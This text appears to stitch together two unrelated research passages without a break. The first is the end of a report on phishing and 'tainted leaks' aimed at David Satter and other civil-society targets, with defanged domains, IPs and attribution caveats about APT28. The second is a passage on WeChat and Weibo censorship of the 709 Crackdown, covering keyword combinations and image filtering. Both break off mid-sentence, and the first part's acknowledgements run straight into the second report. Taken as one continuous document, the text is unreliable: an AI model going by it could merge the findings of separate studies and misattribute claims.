\nFurthermore, during the campaign period, the domain identified by Mandiant, id4242[.]ga resolved to  89.32.40[.]238. This IP also resolves to a range of other suspicious domains with highly similar naming schemas to those connected to the infrastructure used against Satter.\nThe link used to phish John Podesta, as depicted above, also shares distinct naming and subdomain similarities with domains linked to the phishing operation against Satter (see Figure 28): \nDomain targeting Podesta, linked to APT28: hxxp://myaccount.google.com-securitysettingpage[.]tk\nDuring the campaign in March 2016, this domain was hosted at IP address 80.255.12[.]237\nPublications from numerous private industry groups attribute 89.32.40[.]238 and 80.255.12[.]237 (as well as related domains) to APT28. While we are able to point out that there are significant commonalities in domain naming and subdomain structure between the campaign targeting Satter and domains linked to these IPs, we are not able to make a more conclusive technical link to APT28.\nWhile industry groups as well as the U.S. government have publicly connected APT28 with Russian state actors, we are not able to use infrastructure analysis alone to conclusively connect the operation against Satter to a particular state sponsor.  Connecting this infrastructure to a specific government would require additional evidence which is not, to our knowledge, available in the public domain.\nThe Challenge of Attribution\nWhile the order of events surrounding the phishing, credential theft, and eventual leak of tainted documents belonging to David Satter would seem to point to CyberBerkut, the characteristics of Russian information operations make the task of attribution to a state sponsor challenging.  As a consequence, there is no “smoking gun” connecting the evidence we have assembled to a particular Russian government agency, despite the overlaps between our evidence and that presented by numerous industry and government reports concerning Russian-affiliated threat actors. \nAddressing the topic of attribution requires nuance and appreciation of the unique character of Russian cyber espionage: its deliberate cultivation of organized criminal groups as proxy operators, and the high number of independently operating, overlapping, and sometimes competing spy agencies and security services all of whom work within a broad culture of barely concealed corruption.  As one study on Russia notes, Russia’s many security agencies “are granted considerable latitude in their methods, unconstrained by the concerns of diplomats or the scrutiny of legislators.” \nRussia’s approach to the use of proxy actors in the criminal underworld in particular is informed by a very elaborate strategy around information operations and control.  Although this strategy has roots that go back deep into Soviet (and even earlier Russian) history, it was more fully elaborated as a component of hybrid warfare, also known as the Gerasimov doctrine or “non-linear warfare,” and infused with deeper resources after the ‘color revolutions,’ the 2011 Moscow protests, and upon reflection of the events of the Arab Spring.  The overall Russian approach has been described as a form of “guerrilla geopolitics” in which “a would-be great power, aware that its ambitions outstrip its military resources, seeks to leverage the methodologies of an insurgent to maximise its capabilities.” Cultivating organized criminal groups is a fundamental component of this approach, as evidenced in the annexation of Crimea which was undertaken in coordination with criminal elements who provided “political and military muscle.” Russian security officers are also known to routinely dabble in the proceeds of underworld criminal operations for illicit revenue of their own, and as a result can even prioritize criminal over national security concerns.  \nIn the digital arena, this doctrine is manifest in the cultivation of Internet-focused organized criminal groups who operate partially on behalf of or in support of the Putin regime, and partially oriented around their own pecuniary gain in online financial fraud and other schemes. There is evidence Russian hackers are being given wide latitude to undertake criminal activities as long as it conforms to Russian security agencies’ wishes. Multiple Russian-affiliated operators could compromise the same target unwittingly and without seeming coordination.  This “piling on” around a target further complicates attribution.  This complex proxy strategy, as well as the multiple, competing agencies behind the proxies, is often lost or overlooked when companies and government agencies jump quickly to attribution around Russian cyber espionage.  \nWhile it is possible that a proxy actor is implementing the front-end collection component of the phishing campaign we are describing, the scale of the targeting also suggests a well-resourced actor, such as a nation state.  The thread linking all of the targets is their connection to issues that the Russian government cares about. The targets are people whose positions or activities give them access to, or influence over, sensitive information of specific interest to Russia.  This links an otherwise extremely diverse target set, which ranges from domestic Kremlin critics and journalists, to anti-corruption investigators, foreign government personnel, and businesspeople.  \nThe data collected from such a campaign would come in more than a dozen languages, and concern a diverse range of political, military, and policy issues from at least 39 countries and 28 governments.  In addition, such a campaign would be likely to generate large volumes of data.  For this reason, a professionalized, well-resourced operator would be needed for any effective post-collection analysis of the stolen data.  Even greater resources would be required to analyse, and in some instances carefully modify in a short timeframe, the contents of stolen email and cloud-storage accounts for the purposes of seeding disinformation via tainted leaks.\nThe diversity and presumed cost of analyzing the stolen data along with the clear Russian nexus for the targets is only circumstantial evidence of a Russian connection. It should be evaluated in the context of the other pieces of circumstantial evidence we present, including the overlaps in tactics with known Russia-linked actors, and the prominent role of CyberBerkut. \n\nPart 4: Discussion\nIn this section, we examine the troubling relationship between espionage and disinformation, particularly in its latest digital manifestation, and elaborate on how civil society is particularly at risk from such new tactics.\nTainted Leaks: A New Trend\nThe recent theft and disclosure of documents (branded as a “leak”) from the presidential campaign of Emmanuel Macron is the highest profile case in which it appears that falsified documents were inserted amongst real, stolen documents. The documents falsely implied a range of improper or questionable activities. The false stories implied by these documents were then highlighted in campaigns promoted with twitter bots and other techniques. The leak-branded release had followed the release, several days earlier, of a quickly-debunked story, supported by falsified documents, alleging that Macron held foreign bank accounts. \nIn the case of the leak-branded releases during the 2016 US presidential election, the publicly-available evidence connecting these releases with Russian-affiliated cyber operations is largely circumstantial, but compelling.  It is reported, and highly probable, that stronger evidence is available in classified venues.  Building on initial reports by Trend Micro that the Macron campaign was targeted by APT28,’ follow-up reports have pointed to Russian involvement in the breach, and the tainted leaks.\nThe Macron case continues to develop, and many elements are still uncertain, including whether the Macron campaign was deliberately seeding their own communications with false documents, intended to slow down operators’ analysis pipeline. However, it is not the first case in which evidence or claims of tainted leaks have surfaced. \nDocuments stolen from the Open Society Foundations, which had been the victim of a breach,  were modified and then released in a tainted leak by CyberBerkut in a post dated November 21 2015.  The tainting included careful alterations, such as modifying budget documents, to make it appear that certain Russian civil society groups were receiving foreign funding. The case became publicly visible because elements of the same stolen set were re-released on the leak-branded website “DC Leaks,” without the tainting.\nIn the case of David Satter, whose personal email accounts had similarly been breached, and then tainted, materials were edited, spliced, and deleted, while new text was added. Fiction was added to fact to create a hybrid “tainted leak.”  The tainted leak told a series of new, false stories, intended not only to discredit Satter, but to support domestic narratives familiar to many Russians: of foreign interference, and of a foreign hand behind criticism of the government.\nFalsehoods in a Forest of Facts\nRecent leaks by genuine whistleblowers, as well as “leak”-branded releases of materials stolen by cyber espionage operations (e.g. “DC Leaks” or “Macron Leaks”) are appealing because they appear to provide an un-filtered peek at people speaking privately. Like an intercepted conversation, they feel closer to the “truth,” and may indeed reveal unscripted truths about people and institutions. It is hard not to be curious about what salacious details might be contained within them. In the 2016 United States presidential election, it was evident that the release, although clearly intended to influence the election, was viewed by most media organizations as having intrinsic newsworthiness, and thus the contents of leaks were often quickly amplified and repeated.  \nThe potential of leaks to attract attention makes large dumps of stolen materials fertile ground for tainting. A carefully constructed tainted leak included in a set of real stolen material is surrounded by documents that, by juxtaposition, indirectly signal that it is legitimate. This could help the tainted leak survive initial scrutiny by reporters and others seeking corroboration. Coupled with a media strategy, or social-media amplification campaign that selectively highlights the fake or the narrative that the fake supports, leak tainting poses a serious problem to both the victim of the breach, and whoever is implicated by the disinformation.\nThe spread of disinformation can contribute to cynicism about the media and institutions at large as being untrustworthy and unreliable, and can cultivate a fatigue among the population about deciphering what is true or not.  By propagating falsehoods, the aim is not necessarily to convince a population that the falsehood is true (although that outcome is desirable) but rather to have them question the integrity of all media as equally unreliable, and in doing so “foster a kind of policy paralysis.”\nTainted Leaks Place a Unique Burden on Breach Victims\nShould a tainted document gain traction, there is a burden on the victim of the disinformation to prove that the leaks are not genuine. This challenge may be difficult. Victims of breaches may be unable, unwilling, or forbidden to release original documents. Moreover, they may not wish to be drawn into fact-checking their own stolen data. This problem is likely to be especially true if the operators behind the tainted leaks have chosen documents that are themselves sensitive.\nA Russian anti-corruption activist whose name has been seeded into such sensitive reports may not be able to convince the original victim of the breach to release the authentic document. Indeed, such a person may not even be able to determine exactly which parts of the document are real, and which are fake, beyond what they know to be true about themselves.\nMeanwhile, members of the public do not have the ability to carefully verify the integrity of such dumps, either as a whole, or specific documents within them. Indeed, even journalists reporting on accusations or falsehoods may be unable to obtain explicit confirmation of which exact material has been faked. If a tainted document is carefully constructed from real, verifiable elements, it may be especially difficult to identify as a fake. Even if journalists do the hard digging and analysis, they may not be able to publish their results in a timely enough fashion to matter. By the time their work is complete, the false information may have embedded itself into the collective consciousness.\nDisinformation can persist and spread unless concerted measures are taken to counter it.  Even more insidious is the fact that studies have found that attempts “to quash rumors through direct refutation may facilitate their diffusion by increasing fluency.”  In other words, efforts to correct falsehoods can ironically contribute to their further propagation and even acceptance.  \nNot all tainted leaks work as intended to cause maximum harm. Almost immediately following the “Macron Leaks,” the Macron campaign responded quickly, and stated that the “leaks” included fakes. In the fast-moving media environment in the days before voting, this move may have led to uncertainty about the factual nature of the release in the minds of many journalists, dimming enthusiasm to quickly report ‘finds.’ Amplification of the “leaks” was further blocked by a “recommendation to media” by the French electoral authority to not “relay” the leaks. The authority pointed to the presence of fakes, and warned of possible legal implications for reporting the story. \nFollowing the voting, staff from the Macron campaign claimed in the media that the stolen documents also likely contained fakes created by the campaign, designed to waste the time of intruders. This claim also cast further doubt on the veracity of any documents contained in the “leaks.”\nTainted Leaks: Old Methods, New Tactics\nStealing digital information for intelligence purposes is a well-known and commonly practiced tactic used by states. However, a unique aspect of Russian cyber espionage distinguishing it from other governments is the public release of exfiltrated data intended to embarrass or discredit adversaries. Known as “kompromat”, this type of activity is common in Russia, and was previously used by the Soviet Union, and is evident in the publication of emails on Wikileaks related to United States officials involved in the 2016 U.S. presidential election campaign.\nReleasing Satter’s e-mails could be roughly described as kompromat. However, with his cooperation we were able to identify a second feature of the release: the deliberate tampering with the content of his messages. This mixing of fact and falsehood is thus also a disinformation strategy.\nIn Russian / Soviet military doctrine, the practice of deliberately propagating forged documents and disinformation is known as “dezinformatsiya”, referring to manipulation of information in the service of the propagation of falsehoods.  Although practiced for decades by Russia and the Soviet Union, the use of dezinformatsiya in connection with cyber espionage is a new and troublesome frontier in structured digital disinformation. \nWhy Target Civil Society?\nOur investigation identified civil society targets inside and outside of Russia. This targeting is consistent with a general consensus on how the Russian regime thinks: whether domestic or foreign, civil society is treated as a threat to the regime, its extended kleptocracy, and the sovereignty of the country.  \nThere are at least two reasons why civil society factors highly into Russian perceptions of threats.  First, independent civil society groups can create difficulties for the regime by spotlighting corruption and abuse of power, speaking freely about issues the government would rather keep in the shadows, and mobilizing people into organized opposition. \nThose unfamiliar with the Russian experience may overlook a second motivation, which is drawn from the larger Russian narrative of humiliation and defeat at the hands of the United States and its allies at the end of the Cold War.  Some Russian leaders, especially those tied to the old Soviet system, resent US triumphalism, and see local civil society (except for those under their direct control) as instruments of US and western interference in Russian domestic politics. For example, Putin used the term “active measures” to describe the actions of then-Secretary of State Hillary Clinton during the 2011 Moscow demonstration. This narrative of Russia as a “besieged fortress” is used as justification for the repression and targeting of civil society groups both inside Russia proper, in the former Soviet spaces, and abroad.\nWhile often overlooked by western media and policymakers, this threat model translates in practice into targeted digital surveillance operations on civil society, both domestically and abroad. Of special concern to the government are NGOs, journalists, and activists that are seen as having links to the West and / or are funded by western governments.  Many of the targets of this campaign are connected in some degree to United States-based think tanks and fellowships. \nOf equal concern to the government, however, are the actions of domestic NGOs and individuals.  As our report shows, a principal motivation for the targeting of David Satter and the tainting of leaks derived from materials stolen from him was to falsely portray local Russian groups as having affiliations and even funding ties to western organizations and the U.S. government.\nConclusion\nTainted leaks are a growing and particularly troublesome addition to disinformation tactics, and in the current digital environment are likely to become more prevalent.  In the 2017 French presidential election, tainted leaks appear to have been used in an attempt to discredit the political party and candidate for election directly.  The target of the tainting was roughly the same entity that suffered the breach.  In the cases we analyzed, however, tainted leaks were used to discredit third parties who had not been the victims of the original breach.  This difference highlights yet another facet of the growing trend of leak-branded releases, and the challenges they pose.\nTainted leaks—fakes in a forest of facts—test the limits of how media, citizen journalism, and social media users handle fact checking, and the amplification of enticing, but questionable information.  As a tactic, tainted leaks are an evolution of much older strategies for disinformation, and like these earlier strategies, pose a clear threat to public trust in the integrity of information. Interestingly, while the tainting we describe appears to have a primarily domestic aim, to discredit elements of the Russian opposition, it is readily applied globally.\nThe report identified a phishing campaign with over 200 unique targets from 39 countries. We do not conclusively attribute the technical elements of this campaign to a particular sponsor, but there are numerous elements in common between the campaign we analyzed and that which has been publicly reported by industry groups as belonging to threat actors affiliated with Russia.  \nGiven Russia’s well-known preference for the use of proxy actors, it would be highly unlikely that a group such as ours, which relies on open source information, would be able to discover a conclusive link in a case like this. However, it is worth reiterating that the resources of a government would likely be necessary to manage such a large and ambitious campaign, given the number of languages spoken by targets, and their areas of work. The group includes a former Russian Prime Minister, a global list of government ministers, ambassadors, military and government personnel, CEOs of oil companies, and members of civil society from more than three dozen countries. \nThe targets we found are connected to, or have access to, information concerning issues in which the Russian government has a demonstrated interest. These issues range from investigations of individuals close to the Russian president, to the Ukraine, NATO, foreign think tanks working on Russia and the Crimea, grantmakers supporting human rights and free expression in Russia, and the energy sector in the Caucasus.   \nConsidering this primary Russian focus, as well as the technical evidence pointing to overlaps and stylistic similarities with groups attributed to the Russian government, we believe there is strong circumstantial—but not conclusive—evidence for Russian government sponsorship of the phishing campaign, and the tainted leaks.\nThe civil society targets of this operation deserve special attention. At least 21% of the targets from our set were journalists, activists, scholars and other members of civil society. All too often, threats against civil society groups receive second-billing in industry reporting and media coverage of government-linked operations. \nYet, in this case, members of civil society were both the targets of disinformation in the form of tainted leaks, and represented a large proportion of the phished targets. In a cautionary note for grantmakers, several dozen targets all held the same fellowship, from the same organization. This common affiliation suggests that they may have been targeted because of their relationship with the grantmaker.\nWe hope this report will encourage others to engage in further research into the techniques used to propagate tainted leaks, as well as serving as a reminder of the often under-reported presence of civil society targets among government-linked phishing and malware operations. \nAcknowledgements\nSpecial thanks to David Satter, Raphael Satter, and the Open Society Foundations for cooperating and providing us with materials necessary to conduct the investigation.\nThanks to the Citizen Lab team who provided review and assistance, especially Bill Marczak, Masashi Crete-Nishihata, Etienne Maynier, Adam Senft, Irene Poetranto, and Amitpal Singh\nWe would like to thank additional researchers for comments and feedback including Jen Weedon, Alberto Fittarelli, Exigent Petrel and TNG.\nSupport for Citizen Lab’s research on targeted threats comes from the John D. and Catherine T.

The event was later dubbed the “709 Crackdown” (“709大抓捕”), marking when the first lawyer disappeared on July 9, 2015. In January 2017, an attorney of one of the detained rights lawyers issued transcriptions of a meeting with the detainee, detailing torture during police interrogations. Concerned citizens have taken to WeChat and Sina Weibo, two of the most popular social media platforms in China, to advocate for these lawyers and rights defenders. \nThis report is a continuation of research documenting content filtering on WeChat and Sina Weibo. Censorship on these platforms is dynamic and often reactive to news events. \nThrough a series of tests we found content related to the “709 Crackdown” blocked on both platforms. This censorship is implemented in ways that are not transparent to users, a continuation of trends we have seen in past research. Additionally, we provide evidence of images related to the event filtered on WeChat in both chat and WeChat Moments. This finding is the first documentation of image filtering on the app. Similar to keyword filtering, censorship of images, is only enabled for accounts registered to mainland China phone numbers. Our findings serves as a reminder to China-focused NGOs and individuals of the potential hindrances they may face when communicating on Chinese social media platforms.\nExplore our visualization of censored discussions of rights defenders (optimized for mobile):https://citizenlab.org/709crackdownviz\nA Nationwide Crackdown on Rights Defenders and Civil Society At Large\nNearly 250 human rights lawyers and activists in China have been targeted by police in a nationwide crackdown since July 2015. Law firm staff and relatives of the targeted lawyers and activists are reportedly forbidden to leave the country. \nThis targeting has been dubbed the “709 Crackdown,” because the first enforced disappearances of lawyers Wang Yu (王宇) and her husband Bao Longjun (包龙军) took place on July 9, 2015. As of February 16, 2017, four lawyers and activists have been convicted, ten formally charged with various offences, and an additional ten have been released pending further investigation or released on bail. \nEven before July 2015, China’s rights lawyers and activists suffered periodic crackdowns. The ongoing campaign against rights lawyers and activists is considered the Communist Party of China (CPC)’s latest efforts to curb the Weiquan (“Safeguarding Rights”) Movement and civil society at large. The movement, led by a decentralized group of lawyers, legal experts, and intellectuals who seek to protect and defend the civil rights of the citizenry through litigation and legal activism in China, first emerged in 2000. \nThe current systematic crackdown extends beyond mainland Chinese citizens to include Hong Kong booksellers, foreign NGOs based in China, and foreign human rights activists. Human rights lawyer Teng Biao remarked that it is “the largest crackdown seen in China’s civil society since 1989.” \nThe “Anti-China Forces”\nThe CPC has at times deemed rights groups, especially those advocating for civil and political rights, as elements “subversive” to state power and “anti-China forces” harmful to national security. Any physical and legal punishment applied to these groups and its members are often accompanied by public media campaigns aimed at discrediting these groups and restrictions on relevant online discussions.\nIn late 2013, Document No. 9, (formally referred to as the Communiqué on the Current State of the Ideological Sphere), was leaked, showcasing the Chinese leadership’s fear of “Western-style” civil society threatening the CPC and their determination to prohibit the promotion of “universal values” of human rights in China.\nAt the 2017 “Two Sessions”—the annual meetings of China’s top legislature—Zhou Qiang (周强), China’s Chief Justice, and Procurator-General Cao Jianming (曹建明), delivered a work report of the state’s top court and procuratorate (the Chinese office of investigation and prosecution), boasting about the convictions of Zhou Shifeng (周世锋), Hu Shigen (胡石根), and a number of other rights defenders detained in the “709 Crackdown” on charges of “subverting state power” in 2016. Zhou Shifeng is the founder the Beijing Fengrui Law Firm, which frequently defended high profile cases and Hu Shigen is a Chinese advocate for religious freedom. Zhou Qiang and Cao Jianming denounced the idea of judicial independence pledged to help create “a safe and stable social environment” and strike hard on “crimes undermining national security.”\nVocal International Advocates and a Silent Chinese Internet \nSince the 709 Crackdown, China-watchers, international human rights organizations, and lawyers in Hong Kong have launched global petitions to advocate for fair trials and the release of detained lawyers and activists, especially after allegations of the mistreatment of Xie Yang (谢阳), Jiang Tianyong (江天勇) and other detained rights lawyers surfaced. Prior to the most recent UN Human Rights Council meeting in March 2017, eleven countries jointly signed a diplomatic letter and called on the Chinese government to investigate reports of torture against human rights lawyers.The 11 signatories are ambassadors and chargés d’affaires from Australia, Canada, Japan and Switzerland, along with seven European Union member countries including Belgium, the Czech Republic, Estonia, France, Germany, Sweden and the United Kingdom. According to Sophie Richardson, China director at Human Rights Watch, the United States had been invited to sign the letter but declined. The signatory countries also urged China to end the practice of “Residential Surveillance at a Designated Place,” a controversial form of detention used by the authorities to hold suspects in sensitive cases for up to six months, often without their families and lawyers knowing their whereabouts. Hua Chunying, a spokesperson for China’s Ministry of Foreign Affairs, said that the letter “violates the spirit of rule of law”.\nWhile the calls for protecting these individuals are mounting in the international community, in China online information on the 709 Crackdown has been restricted.\nThe majority of the top search results for “709事件” (709 Case) on Baidu, China’s largest search engine, point to an op-ed by Global Times, a state-run newspaper affiliated with the CPC’s official newspaper People’s Daily, ridiculing how public opinion in the West called the 709 Case a “violation of human rights.” Official media has discredited the allegations of torture against rights lawyers as “fake news.” \nChen Guiqiu (陈桂秋), wife of Xie Yang, stated that she was approached by Chinese public security forces and asked “not to contact relatives of other detained lawyers; not to leave the country; not to take interviews from foreign media; not to disseminate information relevant to the 709 case on WeChat or Weibo.” On February 1, 2017, the British Embassy in China posted an EU statement on its official Weibo account (a popular Twitter-like service in China), calling for an investigation of “the account of torture in the case of Xie Yang and the allegations of torture in the cases of Li Heping (李和平) and Wang Quanzhang (王全璋),” as well as “the release of the lawyers and human rights defenders who remain in detention, including Jiang Tianyong.” Figure 1 is a screenshot showing that Weibo users were not able to repost or comment on the post.\n \nFigure 1: Weibo users were not able to forward or comment on a 709 case-related post written by the British Embassy in China as “the content violates either Weibo Community Management Regulations or relevant regulations and policy.”\nRights Defenders Blocked on WeChat\nWeChat (Weixin 微信 in Chinese) is one of the most popular chat applications in China and the fourth largest in the world, with 768 million daily active users. It thrives on the huge user base it has amassed in China, but the Chinese market presents unique challenges. Internet companies in China are required to follow laws and regulations on content monitoring. Failure to control and filter unwanted content can lead to fines or revocation of operating licenses. \nIn previous research, we showed that WeChat enables keyword filtering for users with accounts registered to mainland China phone numbers, and the censorship persists even if these users later link the account to an international number. Keyword censorship is not transparent, no notice is given to a user if their message contains a blocked keyword. The message simply does not appear on the receiver’s end. We also found that more keywords are blocked on group chat, where messages can reach an audience of up to 500 users, than in one-to-one chat.\nWeChat performs censorship on the server-side, which means that messages sent over the app pass through a remote server that contains rules for implementing censorship. If the message includes a keyword that has been targeted for blocking, the entire message will not be sent. Documenting censorship on a system with a server-side implementation requires devising a message of one or more words to test, running that message through the app, and recording the results.\nWeChat Keyword Filtering\nOur previous work found that censorship on WeChat is dynamic and keyword blacklists are updated in reaction to news events. We conducted tests to determine if words related to news events were blocked by collecting front page articles from Chinese-language international and independent news media websites. We copied the text of the article into a chat between an account registered to a mainland China phone number and accounts registered to international phone numbers. If we found the article was censored we then reduced the text in the article down to the minimum number of words required to trigger censorship. If this minimal set of words is in simplified Chinese, then we also test them in traditional Chinese, or vice versa.\nAs part of our initial test, we collected articles from a sample of international and Chinese news websites, including many labeled as “Must-Read” on Fan Qiang Hou (“After You Jumped Over the Wall”), a website maintained by Chinese activist and blogger Wen Yunchao aimed for Chinese Internet users who are circumventing the “Great Firewall.” \nOur initial testing suggested that, among all the news sites in our sample, those that produce mainland China-focused, simplified Chinese-language daily news yielded the most censorship results on WeChat. Therefore, we decided to direct our efforts at collecting news articles from those sites and submit them for testing on WeChat. Table 1 in the Appendix shows a list of news media currently being sampled for our project.\nOne limitation of this method is that sampling has inherent bias and is not comprehensive. Many of the articles are from international media sources, covering political issues that are considered sensitive to the CPC. Moreover, our results are only as accurate as the intersection between our sample and what WeChat is filtering. Therefore, our sample is skewed toward political issues, and there may be other words filtered by WeChat that are outside of our sample. Despite this caveat, monitoring the same websites on a daily basis offers us a sense of what events or themes are subject to more censorship than others over a certain time period. \nOur previous report found that WeChat censors a message if it contains a blacklisted keyword combination. A blacklisted keyword combination is composed of one or more individual keyword components. If a keyword combination is composed of only one keyword component (e.g., “法轮功”), then a message is filtered if that keyword component (“法轮功”) appears anywhere in the message.  If a blacklisted keyword combination is composed of more than one keyword component (e.g., “退党+退团+退队”), then censorship is triggered only if every keyword component (“退党”, “退团”, and “退队”) appears somewhere in the message, although not necessarily adjacently.\nWe found 42 keyword combinations related to China’s crackdown on rights defenders blocked on WeChat in testing from December 1, 2016 to March 27, 2017. The majority (88.1%) of 709 Crackdown-related keyword combinations that we found include at least one keyword component referencing the name of an individual affected by the crackdown. The figure below the Summary section is a visualization of the keyword combinations mentioning one or more individuals. Table 2 shows a breakdown of the non-people related keyword combinations.\n\n\n\nDate Tested\nKeyword Combinations\nTranslation\n\n\n2016-12-01\n台湾+声援+中国人权+律师\nTaiwan + Voice Support + China Human Rights + Lawyer\n\n\n2017-01-24\nDefenders + China + Human + Rights + arrest\nN/A\n\n\n2017-01-24\n失踪+中国维权律师关注组\nMissing + China Human Rights Lawyer Concern Group\n\n\n2017-02-03\n709大抓捕+人权捍卫者+剥夺会见权\n709 Mass Arrest + Human Rights Defender + Deprived of Right to Meet\n\n\n2017-02-04\n709+大抓捕+指定居所监视\n709 + Mass Arrest + Residential Surveillance at Designated Place \n\n\n\nTable 2: A sample of keyword combinations that found blocked on WeChat.\nAll of these keyword combinations are blocked only in group chat with the exception of one keyword combination “台湾+声援+中国人权+律师” (Taiwan + Voice Support + China Human Rights + Lawyer) which is blocked in both group chat and one-to-one chat. That keyword combination is likely referring to the Taiwan Support China Human Rights Lawyers Network (台湾声援中国人权律师网络), a Taiwan-based NGO that publicly condemned the disappearance of Jiang Tianyong.\nThe majority of the blacklisted keyword combinations that we found were in Chinese with the exception of one keyword combination in English (“China+Arrest+Human Rights+Defenders”). Figure 2 shows a group chat conversation between a user registered to a mainland China phone number and accounts registered to international phone numbers. If the China user sends messages with a keyword combination’s components individually, the message can be received by other users, but if the four components are sent together in a sentence by the China account, then other users will not receive the message. \n\n \n\n\nFigure 2. A user registered to a mainland China phone number attempts to send a message with the keyword combination “China+Arrest+Human Rights+Defenders” in a group chat to international users and the message is blocked. If that keyword combination’s components are sent individually, then they are received.\n \nIn Chinese language, we found  41 blocked keyword combinations including “709+江天勇+维权律师” (709 + Jiang Tianyong + rights Lawyer). Figure 3 shows that keyword components can be sent individually, but are blocked if they are sent in a single message. In our example, the sentence “江天勇是一名维权律师，他受709事件事件影响。” was blocked in group chat. \n\n \n\nFigure 3. A user with a China account attempts to send a sentence containing the keyword combination “江天勇+维权律师+709” in a group chat to international users and is blocked. If the keyword components are sent individually they are received. \nAdditional “709 Crackdown” Keyword Testing\nAmong the 42 censored keyword combinations we discovered from our initial round of WeChat testing were the names of 12 individuals affected by the 709 Crackdown. The case itself, however, has so far involved at least 248 lawyers and activists. In attempt to determine the extent of blocked content related to the 709 Crackdown on WeChat, we ran a second type of testing. We wanted to determine if we could use our existing set of keyword combinations already found blocked on WeChat group chat to find keyword combinations targeting any of the other remaining 236 known individuals in the 709 Crackdown. We obtained the list of names and nicknames of the 248 targeted individuals from the latest available data compiled by Amnesty International.<\nTo do this, we generated test messages as follows. We first constructed the set of all keyword components we had previously found censored on WeChat, including those unrelated to the 709 Crackdown (initially, this consisted of 1,474 unique components from 741 different keyword combinations) and then added to this set the names of any of the 248 rights defenders who were not already in it. Since a message containing all of these words would necessarily be filtered, we remove components from this set until it is a set of components that will only trigger censorship if our list of censored keyword combinations is incomplete. \nNamely, in random order, for each keyword combination we know is censored on WeChat, if all of its keyword components are still in the set of words, we remove one of its components at random from the set. (If a keyword combination is an individual keyword, i.e., has only one component, then its component is always removed if it is still in the set.) Thus, at the end of this process, if our list of censored keyword combinations is exhaustive, then a message containing the set of remaining components will never trigger censorship. Moreover, if it does trigger censorship, then we will necessarily find at least one new censored keyword combination in that message. \nDuring the period of March 27 to April 4, 2017, we tested messages randomly generated according to this algorithm until ten messages in a row were not censored. This method produced only two new keyword combinations related to the 709 Crackdown: “梁小军+刘晓波+煽动颠覆” (Liang Xiaojun + Liu Xiaobo + Incite Subversion) and “批评政府+梁小军+权平” (Criticize Government + Liang Xiaojun + Kwon Pyong), and only one new rights defender, 梁小军 (Liang Xiaojun).\nSince this method produced only one new rights defender, this result could mean that certain individuals affected in the 709 Crackdown are considered “more sensitive” and are subject to greater censorship to avoid public discussions. However, this result could also be due to our limited monitoring sample and that we may have missed news articles covering other affected individuals and/or individuals who were not popularly covered by news articles. Future research should further explore event-based censorship by collecting and testing as many articles on the same event as possible to generate a less biased sample and investigate additional methods of discovering censored keyword combinations that do not rely on sampling from news articles. The comprehensive list of keyword combinations that we have found censored on WeChat as of this report is available here, including those found by sampling news articles and by using the technique described in this section. This list also includes keyword combinations unrelated to the 709 Crackdown event.\nWeChat Image Filtering \nIn addition to blocking of keyword combinations related to crackdowns on rights defenders, we also found that WeChat filters images related to the event. Examples of blocked images include the cover of China Human Rights Lawyers Concern Group’s “Report on 709 Mass Arrest,” an infographic explaining the “709 Storm,” an open letter from defenders and their relatives, profiles of convicted lawyers and activists, the twenty six rights defenders on bail while awaiting trial, and fifteen other arrest cases.\nImage censorship occurs in both WeChat’s chat function and WeChat Moments (朋友圈), a feature that resembles Facebook’s Timeline where users can share text-based updates, upload images, and share short videos or articles with their friends. Moments can be seen as having a higher level of intimacy and privacy than other social media products like Weibo or Facebook posts, because a user’s updates on Moments can only be seen by friends verified or selected by the user, and a user can only see interactions of people already on his/her WeChat contact list. \nIn September 2016, Chinese authorities issued new regulations, stating explicitly that messages and comments on social media products like WeChat Moments can be collected and used as “electronic data” to investigate legal cases. Recent cases of WeChat users arrested for “insulting police” or “threatening to blow up a government building” on Moments indicates that the feature may be subject to monitoring by the authorities or the company. \nOn January 30, 2017, we discovered that a number of images related to the 709 Crackdown are blocked in group chat when using an account registered to a mainland China phone number. The censorship was first noticed when we were performing our usual keyword testing of news articles. When we copied and pasted the image accompanying certain news articles about the 709 Crackdown, the image itself was filtered.\n \n\nFigure 4. Evidence of censorship of image in WeChat’s group chat feature. A user with a China account attempts to send a picture of the cover of a report on the 709 Crackdown published by China Human Rights Lawyers Concern Group 中国维权律师关注组 and is blocked. \n \n \nFigure 5. Evidence of implicit censorship of image in WeChat Moments. A user with a China account (on the left) attempts to send an image related to the 709 Crackdown and is hidden from other China account’s Moments feed (on the right). The image is visible in the user’s own feed as well as to an international account (in the middle).\n \nTo get a sense of the extent of image censorship related to the crackdown on WeChat, we used the term “709大追捕” (709 Crackdown) in Google Image Search and identified 575 relevant images between March 18 and 21, 2017. We went on to upload the images to group chat and to Moments for testing. Around ten percent of our sample (58 out of 575) triggered censorship on Moments, most of which are infographics related to the 709 Crackdown, profile sketches of the affected lawyers and their relatives, or images of people holding the slogan “Oppose Torture. Pay attention to Xie Yang” (“反对酷刑，关注谢阳”). All of the images we found censored WeChat Moments are available here.\nOur tests showed that an image on Moments is filtered according to that image’s content in a way that is robust to some modifications to the image. More work is needed to determine what kinds of modifications can be made to an image while having it still be censored by the WeChat image filter and to identify the kind of algorithm WeChat is using to detect filtered images in general.\nSimilar to keyword filtering, censorship of images is only enabled for users with accounts registered to mainland China phone numbers. The filtering is also not transparent. No notice is given to a user if the picture they sent is blocked. Censorship of an image is concealed from the user who posted the censored image. A user in China is able to successfully post a censored image, and the image is visible to international users on that user’s contact list, but the post is hidden from the Moments feed for users in China. We only found images blocked in group chat and Moments. The greater attention to group chat and Moments in particular may be due to the semi-public nature of the two features. Messages can reach and inspire discussions among wider audiences, making it subject to a higher level of scrutiny.\nTracking Censorship of Rights Defenders on Weibo\nA previous Citizen Lab report by Jason Q. Ng shows that Sina Weibo, a Chinese Twitter-like service, implements filtering on its search engine. When search results are filtered users are presented with one of two messages. A user may see a message that explicitly explains the content has been blocked or a more ambiguous error message. \n\n\n\n“根据相关法律法规和政策，搜索结果未予显示” (“According to relevant laws, regulations, and policies, search results cannot be displayed”) \n\n\n\n\n\n\n“抱歉，未找到相关结果” (“Sorry, no relevant results found.”)\n\n\n\nTo test whether Weibo has been censoring content related to the “709 Crackdown,” we submitted the keyword combinations that we found blocked on WeChat through Weibo Search on January 30-31, 2017. We found that unlike WeChat, Weibo consistently censors both simplified Chinese-language and traditional Chinese-language versions of each of its censored keyword combinations, but that like WeChat, Weibo search also uses keyword combinations to trigger censorship.\n\nBoth user messages were returned for the keyword combinations we tested. The criteria for whether a keyword combination triggers the explicit message or the less transparent message are not clear. The removal of any acknowledgment of filtering during searches often makes censorship more difficult to recognize.\n \n\nFigure 6: Evidence of explicit censorship on Sina Weibo search, notifying users that “According to relevant laws, 